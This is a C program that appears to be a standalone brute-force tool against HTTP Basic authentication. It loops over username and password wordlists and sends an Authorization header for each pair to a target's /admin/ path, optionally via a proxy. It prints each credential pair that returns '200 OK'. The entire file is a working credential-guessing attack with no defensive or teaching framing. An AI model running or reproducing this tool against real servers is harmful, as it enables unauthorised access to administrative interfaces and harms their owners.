#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>

#define USER "users.txt"
#define PASS "words.txt"
#define CATALOG "/admin/"

static char table64[]=
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char *port_host;
char *name;

void token(char *arg)
{
  name = strtok(arg, ":");
  port_host = strtok(NULL, "");
  
  if (port_host == NULL)
    port_host = "80";
}

void base64Encode(char *intext, char *output)
{
  unsigned char ibuf[3];
  unsigned char obuf[4];
  int i;
  int inputparts;

  while(*intext) {
    for (i = inputparts = 0; i < 3; i++) { 
      if(*intext) {
        inputparts++;
        ibuf[i] = *intext;
        intext++;
      }
      else
        ibuf[i] = 0;
    }
                       
    obuf [0] = (ibuf [0] & 0xFC) >> 2;
    obuf [1] = ((ibuf [0] & 0x03) << 4) | ((ibuf [1] & 0xF0) >> 4);
    obuf [2] = ((ibuf [1] & 0x0F) << 2) | ((ibuf [2] & 0xC0) >> 6);
    obuf [3] = ibuf [2] & 0x3F;

    switch(inputparts) {
    case 1: /* only one byte read */
      sprintf(output, "%c%c==", 
              table64[obuf[0]],
              table64[obuf[1]]);
      break;
    case 2: /* two bytes read */
      sprintf(output, "%c%c%c=", 
              table64[obuf[0]],
              table64[obuf[1]],
              table64[obuf[2]]);
      break;
    default:
      sprintf(output, "%c%c%c%c", 
              table64[obuf[0]],
              table64[obuf[1]],
              table64[obuf[2]],
              table64[obuf[3]] );
      break;
    }
    output += 4;
  }
  *output=0;
}

int main(int argc, char **argv)
{
  FILE *fd1, *fd2;
  int sd, bytes;
  char buf1[250], buf2[250];
  char buf[250];
  char str1[270], str2[100];
  struct hostent* host;
  struct sockaddr_in servaddr;
  char rez[2000];
  char c[600];

  if (argc < 2 || argc > 3) {
    fprintf(stderr, "Usage: %s host[:port] [proxy][:port]\n\n", argv[0]);
    exit(-1);
  }

  if (argc == 3)
    token(argv[2]);
  else
    token(argv[1]); 

  if ( (host = gethostbyname(name)) == NULL) {
    herror("gethostbyname() failed");
    exit(-1);
  }

  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_port = htons(atoi(port_host));
  servaddr.sin_addr = *((struct in_addr *)host->h_addr);

  if ( (fd1 = fopen(USER, "r")) == NULL) {
    perror("fopen() failed");
    exit(-1);
  }

  while(fgets(buf1, 250, fd1) != NULL)
  {
    buf1[strcspn(buf1, "\r\n\t")] = 0;
    if (strlen(buf1) == 0) continue;

    if( (fd2 = fopen(PASS, "r")) == NULL) {
      perror("fopen() failed");
      exit(-1);
    }

    while(fgets(buf2, 250, fd2) != NULL)
    {
      buf2[strcspn(buf2, "\r\n\t")] = 0;
      if (strlen(buf2) == 0) continue;

      sprintf(c, "%s:%s", buf1, buf2);
      base64Encode(c, rez);

      if ( (sd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
	perror("socket() failed");
	exit(-1);
      }
        
      if (connect(sd, (struct sockaddr *)&servaddr, sizeof(servaddr)) == -1) {
	perror("connect() failed");
	exit(-1);
      }

      if (argc == 2)
	sprintf(str1, "GET %s HTTP/1.1\r\n", CATALOG);
      else
	sprintf(str1, "GET http://%s%s HTTP/1.1\r\n", argv[1], CATALOG);

      sprintf(str2, "Host:%s\r\nAuthorization: Basic %s\r\n\r\n", argv[1], rez);

      send(sd, str1, strlen(str1), 0);
      send(sd, str2, strlen(str2), 0);

      bzero(buf, 250);
    
      bytes = recv(sd, buf, sizeof(buf)-1, 0);
      buf[bytes] = 0;

      if (strstr(buf, "200 OK") != NULL) {
        printf("======================================\n");
        printf("%s", str1);     
        printf("%s\n", str2);
	printf("Result OK: %s\n", c);
        printf("======================================\n");
      }
    
      close(sd); 
    }
  }

  return 0;
}
